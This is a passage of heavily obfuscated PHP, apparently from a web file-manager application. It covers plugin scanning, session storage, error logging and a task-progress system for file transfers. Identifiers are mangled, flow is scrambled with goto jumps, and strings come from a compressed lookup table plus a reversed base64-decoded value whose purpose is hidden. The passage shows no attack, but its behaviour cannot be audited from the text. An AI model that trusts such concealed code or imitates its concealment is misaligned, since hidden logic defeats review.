(!$EÁ†Ñç®½ || $c³°ÎØ‘) { $EÁ†Ñç®½ = $this->getConfigDefault($dƒò…·“Ç„); } return $EÁ†Ñç®½; } public function setConfig($dô´ÊÆ˜‘ï, $e˜ÍÃò® = false) { goto dõï›‰Ş; dõï›‰Ş: $fåÈ¿ˆ¡· =& $_SERVER[Äº¡•ô™Ÿ]; $bÏ‘¬±Ğ¿ = $this->loadList($dô´ÊÆ˜‘ï); if (!$bÏ‘¬±Ğ¿) { return !1; } goto D‡ÏÖèÒäí; aÂØ¦§Œª : $this->update($bÏ‘¬±Ğ¿[$fåÈ¿ˆ¡·[364]], array($fåÈ¿ˆ¡·[6] => $d”Àé§µÏµ)); goto C÷§¹Ë”¼; D‡ÏÖèÒäí: if ($e˜ÍÃò® == !1) { $e˜ÍÃò® = $this->getConfigDefault($dô´ÊÆ˜‘ï); } $d”Àé§µÏµ = $bÏ‘¬±Ğ¿[$fåÈ¿ˆ¡·[6]]; foreach ($e˜ÍÃò® as $F‹†î÷“Ş => $CõÈ©÷ó¿Œ) { $d”Àé§µÏµ[$F‹†î÷“Ş] = is_string($CõÈ©÷ó¿Œ) ? trim($CõÈ©÷ó¿Œ) : $CõÈ©÷ó¿Œ; } goto aÂØ¦§Œª ; C÷§¹Ë”¼: } public function viewList() { goto dòŠÎ’‘ˆÎ; CÂÈÍô®Š»: $eÕ…‘ÈêÔ• = $this->loadPluginList(); $dÀà¡¤¯˜‰ = array(); foreach ($eÕ…‘ÈêÔ• as $DÙèŞé´×÷ => $Dà›¢ë•) { unset($Dà›¢ë•[$fÒ„ƒÃ‹Ãî[2168]], $Dà›¢ë•[$fÒ„ƒÃ‹Ãî[6]]); $aœ”‚ß¾±´ = PLUGIN_DIR . $Dà›¢ë•[$fÒ„ƒÃ‹Ãî[28]] . $fÒ„ƒÃ‹Ãî[2170]; if (!is_file($aœ”‚ß¾±´)) { continue; } $C¨äî“¾ÉĞ = Hook::apply($Dà›¢ë•[$fÒ„ƒÃ‹Ãî[28]] . $fÒ„ƒÃ‹Ãî[2176]); if (is_array($C¨äî“¾ÉĞ)) { $dÀà¡¤¯˜‰[$DÙèŞé´×÷] = array_merge($Dà›¢ë•, $C¨äî“¾ÉĞ); } } goto B ˜œ×„” ; dòŠÎ’‘ˆÎ: $fÒ„ƒÃ‹Ãî =& $_SERVER[Äº¡•ô™Ÿ]; $eÕ…‘ÈêÔ• = $this->loadList(); $this->pluginScan($eÕ…‘ÈêÔ•); goto CÂÈÍô®Š»; B ˜œ×„” : return $dÀà¡¤¯˜‰; goto EõµèÕ¾ºø; EõµèÕ¾ºø: } private function loadPluginList() { $FÁ¿àÚ ğ¥ =& $_SERVER[Äº¡•ô™Ÿ]; $Aæ‚òÙ = $this->loadList(); if (strtolower(MOD) == $FÁ¿àÚ ğ¥[2177]) { return $Aæ‚òÙ; } $A®Ø¯õÓã = Hook::trigger($FÁ¿àÚ ğ¥[2178], $Aæ‚òÙ); if ($Aæ‚òÙ && !$A®Ø¯õÓã) { die; } return $A®Ø¯õÓã ? $A®Ø¯õÓã : $Aæ‚òÙ; } private function pluginScan($BÈ³×ÖÚøè) { $D¹„‡«»š¤ =& $_SERVER[Äº¡•ô™Ÿ]; recursion_dir(PLUGIN_DIR, $A§Ô»ÈÄ©¦, $cõô‹ñî×¦, 0); foreach ($A§Ô»ÈÄ©¦ as $fÖ©ã„ÔÍ‰) { $C«Óê‹•° = get_path_this($fÖ©ã„ÔÍ‰); if (isset($BÈ³×ÖÚøè[$C«Óê‹•°]) || !file_exists($fÖ©ã„ÔÍ‰ . $D¹„‡«»š¤[2179]) || !file_exists($fÖ©ã„ÔÍ‰ . $D¹„‡«»š¤[2170])) { continue; } Hook::apply($C«Óê‹•° . $D¹„‡«»š¤[2173]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\145\x6d\137\163\145\x73\x73\151\157\156"; public function get($e­¯µ‘Î») { $EôÏÀãâŒø =& $_SERVER[Äº¡•ô™Ÿ]; $Eéï…£ó‘× = $this->where(array($EôÏÀãâŒø[2180] => $e­¯µ‘Î»))->find(); if (!is_array($Eéï…£ó‘×)) { return !1; } return $Eéï…£ó‘×[$EôÏÀãâŒø[695]]; } public function set($bÀ›˜®ª³¡, $CÍ‘•’Ó, $a™—†ø²ï = 3600) { $a×õœ‘®ß¸ =& $_SERVER[Äº¡•ô™Ÿ]; $CÁÙŒÓÛÌó = array($a×õœ‘®ß¸[2180] => $bÀ›˜®ª³¡, $a×õœ‘®ß¸[2109] => $CÍ‘•’Ó, $a×õœ‘®ß¸[2181] => $a™—†ø²ï + time()); if (Session::get($a×õœ‘®ß¸[2182])) { $CÁÙŒÓÛÌó[$a×õœ‘®ß¸[1416]] = Session::get($a×õœ‘®ß¸[2182]); } else { $CÁÙŒÓÛÌó[$a×õœ‘®ß¸[1416]] = 0; } if ($this->get($bÀ›˜®ª³¡)) { return $this->where(array($a×õœ‘®ß¸[2180] => $bÀ›˜®ª³¡))->save($CÁÙŒÓÛÌó); } else { return $this->add($CÁÙŒÓÛÌó, array(), !0); } } public function remove($fÂ²Ì·™‘¿) { return $this->where(array($_SERVER[Äº¡•ô™Ÿ][2180] => $fÂ²Ì·™‘¿))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Äº¡•ô™Ÿ][2183] . time())->delete(); } } goto FÃ‡šŠÓå ; DŒÎ­ùÀšÌ: define($_SERVER[Äº¡•ô™Ÿ][0], $_SERVER[Äº¡•ô™Ÿ][1]); $_SERVER[•Éº±‡£‰èä] = explode($_SERVER[Äº¡•ô™Ÿ][2], gzinflate(substr($_SERVER[Äº¡•ô™Ÿ][3], 10, -8))); function Model($eíİ¿Ãä = '', $bÂ‰¹›‡½¡ = '', $dÍ¢æĞ×ê¡ = '') { goto a‡ÆÀÁìç; AØ‡…ƒùÑ‹: if (isset($c’·ÌöÓŒ[$cˆÒ‰ù¾è›])) { return $c’·ÌöÓŒ[$cˆÒ‰ù¾è›]; } if ($eíİ¿Ãä) { $eíİ¿Ãä = strtoupper($eíİ¿Ãä[0]) . substr($eíİ¿Ãä, 1); $Fù¯ÅĞš¥¤ = $eíİ¿Ãä . $b«¹ÛÔÄÈ[1]; if (class_exists($Fù¯ÅĞš¥¤)) { $c’·ÌöÓŒ[$cˆÒ‰ù¾è›] = new $Fù¯ÅĞš¥¤(); return $c’·ÌöÓŒ[$cˆÒ‰ù¾è›]; } } if (!$dÍ¢æĞ×ê¡) { $dÍ¢æĞ×ê¡ = $GLOBALS[$b«¹ÛÔÄÈ[2]][$b«¹ÛÔÄÈ[3]]; } goto D«ğÃä»‘Ü; a‡ÆÀÁìç: $b«¹ÛÔÄÈ =& $_SERVER[•Éº±‡£‰èä]; static $c’·ÌöÓŒ = array(); $cˆÒ‰ù¾è› = strtolower($bÂ‰¹›‡½¡ . $b«¹ÛÔÄÈ[0] . $eíİ¿Ãä); goto AØ‡…ƒùÑ‹; D«ğÃä»‘Ü: $c’·ÌöÓŒ[$cˆÒ‰ù¾è›] = new ModelBase($eíİ¿Ãä, $bÂ‰¹›‡½¡, $dÍ¢æĞ×ê¡); return $c’·ÌöÓŒ[$cˆÒ‰ù¾è›]; goto E‡Ü©­æá¹; E‡Ü©­æá¹: } goto CÜ©²òÜ™š; eè…²ÆÉÈ: function beforeShutdownError($eóø‚ª¤ = false, $aãµêŠ×Ø = '', $e´‹¤ª„Çí = '', $a¹‰ÃÌ ­³ = 0) { $A•Ò‚ßí =& $_SERVER[•Éº±‡£‰èä]; switch ($eóø‚ª¤) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $cƒ¸Ä©§Ë = $A•Ò‚ßí[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $cƒ¸Ä©§Ë = $A•Ò‚ßí[40]; break; case E_STRICT: $cƒ¸Ä©§Ë = $A•Ò‚ßí[41]; break; case E_NOTICE: case E_USER_NOTICE: $cƒ¸Ä©§Ë = $A•Ò‚ßí[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $cƒ¸Ä©§Ë = $A•Ò‚ßí[43]; break; default: break; } if (!$cƒ¸Ä©§Ë || $cƒ¸Ä©§Ë == $A•Ò‚ßí[42] || $cƒ¸Ä©§Ë == $A•Ò‚ßí[43]) { return; } $e´‹¤ª„Çí = $A•Ò‚ßí[4] . str_replace($_SERVER[$A•Ò‚ßí[37]], $A•Ò‚ßí[20], $e´‹¤ª„Çí); $fµÇ§åğ‡ = $cƒ¸Ä©§Ë . $A•Ò‚ßí[44] . $aãµêŠ×Ø . $A•Ò‚ßí[44] . $e´‹¤ª„Çí . $A•Ò‚ßí[44] . $a¹‰ÃÌ ­³; write_log($fµÇ§åğ‡ . $A•Ò‚ßí[18] . get_caller_msg(1), $A•Ò‚ßí[19]); } $_SERVER[$_SERVER[•Éº±‡£‰èä][45]] = $_SERVER[$_SERVER[•Éº±‡£‰èä][37]] . $_SERVER[•Éº±‡£‰èä][46]; $bÎäÏø§˜© = strrev(base64_decode($_SERVER[•Éº±‡£‰èä][47])); goto eÃÓ° …›; AªË‚çò÷: class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\162\x75\x6e\156\x69\x6e\147"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($cöæõ‡ŠÛ”, $AóÔ¾·İæ¯ = '', $AÚô©«Ş¹‚ = 0, $e°‹õ”¶¯Ç = '') { goto Dİˆ‘î°‹´; F³ˆé´É¤Ù: Hook::trigger($Dø÷ñ­«¹Ğ[1427], $this->task); $this->task[$Dø÷ñ­«¹Ğ[1421]] = timeFloat(); self::valueSet($this->task[$Dø÷ñ­«¹Ğ[364]], $this->task); goto CÓ¶Üìè‡Ö; d÷¡Ó£æ…: Hook::bind($Dø÷ñ­«¹Ğ[1382], array($this, $Dø÷ñ­«¹Ğ[1424])); Hook::bind($Dø÷ñ­«¹Ğ[1425], array($this, $Dø÷ñ­«¹Ğ[1426])); $this->startAfter(); goto F³ˆé´É¤Ù; Dİˆ‘î°‹´: $Dø÷ñ­«¹Ğ =& $_SERVER[Äº¡•ô™Ÿ]; if (self::get($cöæõ‡ŠÛ”)) { return; } $this->task = array($Dø÷ñ­«¹Ğ[364] => $cöæõ‡ŠÛ”, $Dø÷ñ­«¹Ğ[1416] => USER_ID, $Dø÷ñ­«¹Ğ[1321] => $e°‹õ”¶¯Ç, $Dø÷ñ­«¹Ğ[29] => $AóÔ¾·İæ¯, $Dø÷ñ­«¹Ğ[980] => $Dø÷ñ­«¹Ğ[33], $Dø÷ñ­«¹Ğ[978] => $AÚô©«Ş¹‚, $Dø÷ñ­«¹Ğ[990] => 0, $Dø÷ñ­«¹Ğ[1417] => 0, $Dø÷ñ­«¹Ğ[1418] => 0, $Dø÷ñ­«¹Ğ[1419] => timeFloat(), $Dø÷ñ­«¹Ğ[1420] => 0, $Dø÷ñ­«¹Ğ[1421] => 0, $Dø÷ñ­«¹Ğ[1422] => 0, $Dø÷ñ­«¹Ğ[1423] => 0, $Dø÷ñ­«¹Ğ[692] => $Dø÷ñ­«¹Ğ[1380]); goto d÷¡Ó£æ…; CÓ¶Üìè‡Ö: } public function end() { goto bñÆ¢©‹ê; bñÆ¢©‹ê: $bì×Ò‰‹Ü =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->task) { return; } if ($this->task[$bì×Ò‰‹Ü[1421]]) { self::valueSet($this->task[$bì×Ò‰‹Ü[364]], !1); } goto f ô…¨ù£í; f ô…¨ù£í: $FËĞ¹ùÅ‚‰ = timeFloat() - $this->task[$bì×Ò‰‹Ü[1419]]; self::log($bì×Ò‰‹Ü[1428] . $this->task[$bì×Ò‰‹Ü[364]] . $bì×Ò‰‹Ü[1429] . $FËĞ¹ùÅ‚‰ . $bì×Ò‰‹Ü[1430]); Hook::unbind($bì×Ò‰‹Ü[1382], array($this, $bì×Ò‰‹Ü[1424])); goto dÆ…„Ê¢„; dÆ…„Ê¢„: Hook::unbind($bì×Ò‰‹Ü[1425], array($this, $bì×Ò‰‹Ü[1426])); $this->endAfter(); $this->task = !1; goto FÊ¶•˜ï¡‚; FÊ¶•˜ï¡‚: } public function update($cÕÚ‚‘”›¨ = 0) { goto fªÆÒø±»ï; cÛ‡°–ªÙË: $Aó²³ñ²ùÕ[$CãìÓí™[692]] = $B£×ï†ñ‘• ? $B£×ï†ñ‘• : $Aó²³ñ²ùÕ[$CãìÓí™[692]]; $Aó²³ñ²ùÕ[$CãìÓí™[1422]] = $BæøÆ›ˆĞá[$CãìÓí™[1422]] ? $BæøÆ›ˆĞá[$CãìÓí™[1422]] : 0; $Aó²³ñ²ùÕ[$CãìÓí™[1421]] = timeFloat(); goto F†·à„Â­‰; fäÛºŞ³ìÙ: $Aó²³ñ²ùÕ[$CãìÓí™[990]] += $cÕÚ‚‘”›¨; $Aó²³ñ²ùÕ[$CãìÓí™[1420]] = timeFloat(); if ($Aó²³ñ²ùÕ[$CãìÓí™[978]]) { if ($Aó²³ñ²ùÕ[$CãìÓí™[978]] < $Aó²³ñ²ùÕ[$CãìÓí™[990]]) { $Aó²³ñ²ùÕ[$CãìÓí™[978]] = $Aó²³ñ²ùÕ[$CãìÓí™[990]]; } $Eî±¤ŠÚùó = timeFloat() - $Aó²³ñ²ùÕ[$CãìÓí™[1419]] - $Aó²³ñ²ùÕ[$CãìÓí™[1422]]; $Aó²³ñ²ùÕ[$CãìÓí™[1417]] = $Aó²³ñ²ùÕ[$CãìÓí™[990]] / $Aó²³ñ²ùÕ[$CãìÓí™[978]]; $Aó²³ñ²ùÕ[$CãìÓí™[1418]] = $Aó²³ñ²ùÕ[$CãìÓí™[990]] / $Eî±¤ŠÚùó; if ($Aó²³ñ²ùÕ[$CãìÓí™[1417]] > 0) { $Aó²³ñ²ùÕ[$CãìÓí™[1423]] = $Eî±¤ŠÚùó * (1 - $Aó²³ñ²ùÕ[$CãìÓí™[1417]]) / $Aó²³ñ²ùÕ[$CãìÓí™[1417]]; } $Aó²³ñ²ùÕ[$CãìÓí™[1423]] = $Aó²³ñ²ùÕ[$CãìÓí™[1423]] <= 0 ? 0 : $Aó²³ñ²ùÕ[$CãìÓí™[1423]]; } goto A¼“çÅ–“š; F†·à„Â­‰: Hook::trigger($CãìÓí™[1434], $Aó²³ñ²ùÕ); self::valueSet($Aó²³ñ²ùÕ[$CãìÓí™[364]], $Aó²³ñ²ùÕ); goto a‡£Œ˜ğ¡„; fªÆÒø±»ï: $CãìÓí™ =& $_SERVER[Äº¡•ô™Ÿ]; $Aó²³ñ²ùÕ =& $this->task; if (!$Aó²³ñ²ùÕ) { return; } goto fäÛºŞ³ìÙ; Fçù„¨ö—£: $BæøÆ›ˆĞá = self::get($Aó²³ñ²ùÕ[$CãìÓí™[364]]); $B£×ï†ñ‘• = $BæøÆ›ˆĞá[$CãìÓí™[692]]; if ($B£×ï†ñ‘• == self::STATYS_KILL) { $bÍï¹Š´‘Ã = array($CãìÓí™[1431] => LNG($CãìÓí™[1432]), $CãìÓí™[1032] => !1); Cache::set($CãìÓí™[1433] . $this->task[$CãìÓí™[364]], $bÍï¹Š´‘Ã, 30); $this->end(); die; } else { if ($B£×ï†ñ‘• == self::STATYS_STOP) { $EÚ¢¸ã…­ = 2; $BæøÆ›ˆĞá[$CãìÓí™[1422]] += $EÚ¢¸ã…­; self::valueSet($Aó²³ñ²ùÕ[$CãìÓí™[364]], $BæøÆ›ˆĞá); sleep($EÚ¢¸ã…­); $this->update(); return; } } goto cÛ‡°–ªÙË; A¼“çÅ–“š: $this->updateAfter(); $fâô˜÷ç = 0.2; if (timeFloat() - $Aó²³ñ²ùÕ[$CãìÓí™[1421]] < $fâô˜÷ç) { return; } goto Fçù„¨ö—£; a‡£Œ˜ğ¡„: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($aø„¬œäß) { $e†×ïç³¡ =& $_SERVER[Äº¡•ô™Ÿ]; Cache::set($e†×ïç³¡[1433] . $this->task[$e†×ïç³¡[364]], $aø„¬œäß, 60); return $aø„¬œäß; } public static function get($Aâ»…—ˆ»›) { return self::valueGet($Aâ»…—ˆ»›); } public static function listData() { $fƒ•Ê‘ì = self::valueGet(); return array_sort_by($fƒ•Ê‘ì, $_SERVER[Äº¡•ô™Ÿ][1419], !0); } public static function kill($FæØá°ìªÊ) { return self::changeStatus($FæØá°ìªÊ, self::STATYS_KILL); } public static function stop($aÇ†§Ó²°á) { return self::changeStatus($aÇ†§Ó²°á, self::STATYS_STOP); } public static function restart($c» ‘“Ë­) { return self::changeStatus($c» ‘“Ë­, self::STATYS_RUNNING); } public static function killAll() { $a—àãø›¶ =& $_SERVER[Äº¡•ô™Ÿ]; $FÅÕ¨¯·§ = self::listData(); foreach ($FÅÕ¨¯·§ as $EØ•Š›ç½‡) { self::kill($EØ•Š›ç½‡[$a—àãø›¶[364]]); } sleep(2); foreach ($FÅÕ¨¯·§ as $EØ•Š›ç½‡) { self::valueSet($EØ•Š›ç½‡[$a—àãø›¶[364]], !1); } } private static function changeStatus($BÃÏï½ÊÆó, $Fç–±×ëÄ‰) { goto bÒëºæĞÏ; C»ßç©®İ¸: $AÔÕ¶Ğ¾…Ò[$d±àÑÀ‘Íö[692]] = $Fç–±×ëÄ‰; self::valueSet($BÃÏï½ÊÆó, $AÔÕ¶Ğ¾…Ò); self::log($d±àÑÀ‘Íö[1435] . $AÔÕ¶Ğ¾…Ò[$d±àÑÀ‘Íö[364]] . $d±àÑÀ‘Íö[1436] . $Fç–±×ëÄ‰); goto A«÷¦ŠøƒÆ; bÒëºæĞÏ: $d±àÑÀ‘Íö =& $_SERVER[Äº¡•ô™Ÿ]; $AÔÕ¶Ğ¾…Ò = self::valueGet($BÃÏï½ÊÆó); if (!$AÔÕ¶Ğ¾…Ò) { return !1; } goto C»ßç©®İ¸; A«÷¦ŠøƒÆ: return !0; goto BÆ‡„…Ö; BÆ‡„…Ö: } public static function valueGet($Dò¥¯½ô¸ = false) { $F¤˜¾™†¢  =& $_SERVER[Äº¡•ô™Ÿ]; if ($Dò¥¯½ô¸) { $aÖÃä¼í  = Model($F¤˜¾™†¢ [395])->where(array($F¤˜¾™†¢ [89] => $Dò¥¯½ô¸, $F¤˜¾™†¢ [29] => $F¤˜¾™†¢ [1437]))->find(); return $aÖÃä¼í  ? json_decode($aÖÃä¼í [$F¤˜¾™†¢ [356]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($EîÎøÒÖ°³ = false) { goto f¼ÂŠ§÷ñ†; dÊ®´áËØâ: $DèŞˆºó = Model($böØõ¾î¦Ş[395])->where($bÖ¨£–È)->select(); $DèŞˆºó = $DèŞˆºó ? $DèŞˆºó : array(); foreach ($DèŞˆºó as $dƒ”½ Ò¡Ü => $CåâÅù®ÅÖ) { $DèŞˆºó[$dƒ”½ Ò¡Ü] = json_decode($CåâÅù®ÅÖ[$böØõ¾î¦Ş[356]], !0); } goto b Ï¦ŸÑ»œ; b Ï¦ŸÑ»œ: return $DèŞˆºó; goto B¢ñ§•½ğ; f¼ÂŠ§÷ñ†: $böØõ¾î¦Ş =& $_SERVER[Äº¡•ô™Ÿ]; $bÖ¨£–È = array($böØõ¾î¦Ş[29] => $böØõ¾î¦Ş[1437]); if ($EîÎøÒÖ°³) { $bÖ¨£–È[$böØõ¾î¦Ş[1416]] = $EîÎøÒÖ°³; } goto dÊ®´áËØâ; B¢ñ§•½ğ: } public static function valueSet($dçèŞ…³ë…, $B‹ä‹õò–) { goto e½ªö‚ãÛñ; DĞğË‚ˆï: Model($BŸ‡¾İÎÙ²[395])->add($Eœª¿‡Ã Ó, array(), !0); goto d£†Ÿ•ô°‹; e½ªö‚ãÛñ: $BŸ‡¾İÎÙ² =& $_SERVER[Äº¡•ô™Ÿ]; if (!$B‹ä‹õò–) { return Model($BŸ‡¾İÎÙ²[395])->where(array($BŸ‡¾İÎÙ²[89] => $dçèŞ…³ë…, $BŸ‡¾İÎÙ²[29] => $BŸ‡¾İÎÙ²[1437]))->delete(); } $bÄ˜ˆÛìØ = json_encode($B‹ä‹õò–); goto b»¡öñ³; b»¡öñ³: if (!$bÄ˜ˆÛìØ) { ob_start(); var_dump($B‹ä‹õò–); $EÜŒÔ¯Ì¾÷ = ob_get_clean(); self::log($BŸ‡¾İÎÙ²[1438] . json_encode_force($EÜŒÔ¯Ì¾÷)); } if (!$dçèŞ…³ë… || !$B‹ä‹õò–[$BŸ‡¾İÎÙ²[364]]) { return !1; } $Eœª¿‡Ã Ó = array($BŸ‡¾İÎÙ²[29] => $BŸ‡¾İÎÙ²[1437], $BŸ‡¾İÎÙ²[1416] => USER_ID, $BŸ‡¾İÎÙ²[89] => $dçèŞ…³ë…, $BŸ‡¾İÎÙ²[356] => $bÄ˜ˆÛìØ); goto DĞğË‚ˆï; d£†Ÿ•ô°‹: } public static function log($BÅò†ã¢›) { write_log($BÅò†ã¢›, $_SERVER[Äº¡•ô™Ÿ][1439]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto Eğ¡æõÃ¨ë; Eğ¡æõÃ¨ë: $fÎˆÓ”Í =& $_SERVER[Äº¡•ô™Ÿ]; $d¬Ü®®Ï´° =& $this->task; $this->sourceCopyFolder = !1; goto f¢è•‰™µ; f¢è•‰™µ: Hook::bind($fÎˆÓ”Í[1440], array($this, $fÎˆÓ”Í[1441])); Hook::bind($fÎˆÓ”Í[1442], array($this, $fÎˆÓ”Í[1443])); Hook::bind($fÎˆÓ”Í[1444], array($this, $fÎˆÓ”Í[1445])); goto FÂ‘Ûİïá…; FÂ‘Ûİïá…: Hook::bind($fÎˆÓ”Í[535], array($this, $fÎˆÓ”Í[1446])); Hook::bind($fÎˆÓ”Í[536], array($this, $fÎˆÓ”Í[1447])); Hook::bind($fÎˆÓ”Í[538], array($this, $fÎˆÓ”Í[1448])); goto Bë†àèîÊÆ; fÆéÓÅêè: Hook::bind($fÎˆÓ”Í[1453], array($this, $fÎˆÓ”Í[1454])); Hook::bind($fÎˆÓ”Í[1455], array($this, $fÎˆÓ”Í[1456])); Hook::bind($fÎˆÓ”Í[1457], array($this, $fÎˆÓ”Í[1458])); goto bğõíº¹‹º; Bë†àèîÊÆ: Hook::bind($fÎˆÓ”Í[539], array($this, $fÎˆÓ”Í[1448])); Hook::bind($fÎˆÓ”Í[505], array($this, $fÎˆÓ”Í[1449])); Hook::bind($fÎˆÓ”Í[502], array($this, $fÎˆÓ”Í[1449])); goto b‚ÒŸ‰Òˆ; b‚ÒŸ‰Òˆ: Hook::bind($fÎˆÓ”Í[507], array($this, $fÎˆÓ”Í[1449])); Hook::bind($fÎˆÓ”Í[509], array($this, $fÎˆÓ”Í[1449])); Hook::bind($fÎˆÓ”Í[511], array($this, $fÎˆÓ”Í[1449])); goto AÌ‚¯êóĞ…; FàŠÁ†¹ˆ¤: $d¬Ü®®Ï´°[$fÎˆÓ”Í[980]] = $fÎˆÓ”Í[33]; $d¬Ü®®Ï´°[$fÎˆÓ”Í[1463]] = $fÎˆÓ”Í[33]; $d¬Ü®®Ï´°[$fÎˆÓ”Í[1464]] = 0; goto DÊÔÕóÏ›; bğõíº¹‹º: $d¬Ü®®Ï´°[$fÎˆÓ”Í[1459]] = LNG($fÎˆÓ”Í[1460]); $d¬Ü®®Ï´°[$fÎˆÓ”Í[1461]] = 0; $d¬Ü®®Ï´°[$fÎˆÓ”Í[1462]] = 0; goto FàŠÁ†¹ˆ¤; AÌ‚¯êóĞ…: Hook::bind($fÎˆÓ”Í[1450], array($this, $fÎˆÓ”Í[1451])); Hook::bind($fÎˆÓ”Í[528], array($this, $fÎˆÓ”Í[1452])); $this->sourceModelCopyFlag = !1; goto fÆéÓÅêè; DÊÔÕóÏ›: if (!$d¬Ü®®Ï´°[$fÎˆÓ”Í[1321]]) { $d¬Ü®®Ï´°[$fÎˆÓ”Í[1321]] = LNG($fÎˆÓ”Í[1465]); } goto Bèº¡Ğ†Ó; Bèº¡Ğ†Ó: } protected function endAfter() { goto E»µ½œ©; c­¢Ü»ÕÜ“: Hook::unbind($b¿ñØ¬‹‡Á[511], array($this, $b¿ñØ¬‹‡Á[1449])); Hook::unbind($b¿ñØ¬‹‡Á[1450], array($this, $b¿ñØ¬‹‡Á[1451])); Hook::unbind($b¿ñØ¬‹‡Á[528], array($this, $b¿ñØ¬‹‡Á[1452])); goto F×Í”¶µ‰¡; E»µ½œ©: $b¿ñØ¬‹‡Á =& $_SERVER[Äº¡•ô™Ÿ]; Hook::unbind($b¿ñØ¬‹‡Á[1440], array($this, $b¿ñØ¬‹‡Á[1441])); Hook::unbind($b¿ñØ¬‹‡Á[1442], array($this, $b¿ñØ¬‹‡Á[1443])); goto A¡Çç‰¯ÉÏ; B„‘“İŠˆò: Hook::unbind($b¿ñØ¬‹‡Á[502], array($this, $b¿ñØ¬‹‡Á[1449])); Hook::unbind($b¿ñØ¬‹‡Á[507], array($this, $b¿ñØ¬‹‡Á[1449])); Hook::unbind($b¿ñØ¬‹‡Á[509], array($this, $b¿ñØ¬‹‡Á[1449])); goto c­¢Ü»ÕÜ“; F×Í”¶µ‰¡: Hook::unbind($b¿ñØ¬‹‡Á[1453], array($this, $b¿ñØ¬‹‡Á[1454])); Hook::unbind($b¿ñØ¬‹‡Á[1455], array($this, $b¿ñØ¬‹‡Á[1456])); Hook::unbind($b¿ñØ¬‹‡Á[1457], array($this, $b¿ñØ¬‹‡Á[1458])); goto Bîœù¿µ‹è; A¡Çç‰¯ÉÏ: Hook::unbind($b¿ñØ¬‹‡Á[1444], array($this, $b¿ñØ¬‹‡Á[1445])); Hook::unbind($b¿ñØ¬‹‡Á[535], array($this, $b¿ñØ¬‹‡Á[1446])); Hook::unbind($b¿ñØ¬‹‡Á[536], array($this, $b¿ñØ¬‹‡Á[1447])); goto dÈìĞ»¾ç; dÈìĞ»¾ç: Hook::unbind($b¿ñØ¬‹‡Á[538], array($this, $b¿ñØ¬‹‡Á[1448])); Hook::unbind($b¿ñØ¬‹‡Á[539], array($this, $b¿ñØ¬‹‡Á[1448])); Hook::unbind($b¿ñØ¬‹‡Á[505], array($this, $b¿ñØ¬‹‡Á[1449])); goto B„‘“İŠˆò; Bîœù¿µ‹è: } public function copyMoveStart($EŒ÷äÄ‹—Ë, $Cİïà™ôÀ‘, $BŞÖÁáÑ›, $FË¤‚İç´¬) { } public function updateAfter() { goto Eº‚“Ñõğ¨; Eº‚“Ñõğ¨: $AÓƒ°Â”‘ =& $_SERVER[Äº¡•ô™Ÿ]; $DšÑ‘„ç÷å =& $this->task; if (!$DšÑ‘„ç÷å[$AÓƒ°Â”‘[701]]) { return; } goto a°¦ ™°ËĞ; a°¦ ™°ËĞ: if ($this->sourceModelCopyFlag) { return; } $bÏÏ†ö£ = 0; if ($DšÑ‘„ç÷å[$AÓƒ°Â”‘[1463]] == $AÓƒ°Â”‘[1040]) { $bÏÏ†ö£ = $DšÑ‘„ç÷å[$AÓƒ°Â”‘[1462]] * 0.5; } else { if ($DšÑ‘„ç÷å[$AÓƒ°Â”‘[1463]] == $AÓƒ°Â”‘[91]) { $bÏÏ†ö£ = $DšÑ‘„ç÷å[$AÓƒ°Â”‘[1462]] * 0.5 + $DšÑ‘„ç÷å[$AÓƒ°Â”‘[1461]] * 0.5; } } goto cç‰„³É¥; cç‰„³É¥: $DšÑ‘„ç÷å[$AÓƒ°Â”‘[1417]] = ($DšÑ‘„ç÷å[$AÓƒ°Â”‘[1466]] + $bÏÏ†ö£) / $DšÑ‘„ç÷å[$AÓƒ°Â”‘[701]]; if ($DšÑ‘„ç÷å[$AÓƒ°Â”‘[1417]] > 0) { $CŠäàœ³ä = timeFloat() - $DšÑ‘„ç÷å[$AÓƒ°Â”‘[1419]] - $DšÑ‘„ç÷å[$AÓƒ°Â”‘[1422]]; $DšÑ‘„ç÷å[$AÓƒ°Â”‘[1423]] = $CŠäàœ³ä * (1 - $DšÑ‘„ç÷å[$AÓƒ°Â”‘[1417]]) / $DšÑ‘„ç÷å[$AÓƒ°Â”‘[1417]]; } goto d«²°†„–™; d«²°†„–™: } public function addPath($Eºë›à’¡) { goto E¦Ã×½è¾; dãø­á¨æ: $d‹©Ûº’îÓ = IO::infoWithChildren($Eºë›à’¡); $F¿½ƒŒ° = $b¹ŞÄŠ²¦[$D“¾ƒå•¸[1467]] ? $b¹ŞÄŠ²¦[$D“¾ƒå•¸[1467]][$D“¾ƒå•¸[1468]] : 0; $b¹ŞÄŠ²¦[$D“¾ƒå•¸[1467]] = array($D“¾ƒå•¸[1468] => $F¿½ƒŒ° + 1, $D“¾ƒå•¸[383] => $d‹©Ûº’îÓ[$D“¾ƒå•¸[28]], $D“¾ƒå•¸[75] => $d‹©Ûº’îÓ[$D“¾ƒå•¸[75]], $D“¾ƒå•¸[462] => $d‹©Ûº’îÓ[$D“¾ƒå•¸[462]] ? $d‹©Ûº’îÓ[$D“¾ƒå•¸[462]] : $d‹©Ûº’îÓ[$D“¾ƒå•¸[75]]); goto BïÈÙ„‡‰’; E¦Ã×½è¾: $D“¾ƒå•¸ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$Eºë›à’¡) { return; } $b¹ŞÄŠ²¦ =& $this->task; goto dãø­á¨æ; BïÈÙ„‡‰’: if ($d‹©Ûº’îÓ[$D“¾ƒå•¸[29]] == $D“¾ƒå•¸[164]) { $b¹ŞÄŠ²¦[$D“¾ƒå•¸[978]] += 1; } else { $b¹ŞÄŠ²¦[$D“¾ƒå•¸[978]] += $d‹©Ûº’îÓ[$D“¾ƒå•¸[80]][$D“¾ƒå•¸[78]]; if 